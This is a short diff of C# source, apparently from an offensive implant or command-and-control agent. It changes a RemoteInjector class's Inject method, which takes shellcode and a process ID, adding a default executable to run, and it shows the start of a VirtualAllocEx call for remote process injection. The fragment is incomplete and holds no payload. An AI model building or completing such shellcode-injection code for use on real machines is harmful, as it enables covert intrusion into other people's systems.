@@ -9,7 +9,7 @@ namespace Agent.Internal
 {
     public class RemoteInjector : Injector
     {
-        public override bool Inject(byte[] shellcode, int pid = 0)
+        public override bool Inject(byte[] shellcode, int pid = 0, string exeToRun = @"C:\windows\system32\notepad.exe")
         {
             var target = Process.GetProcessById(pid);
             var baseAddr = Native.Kernel32.VirtualAllocEx(
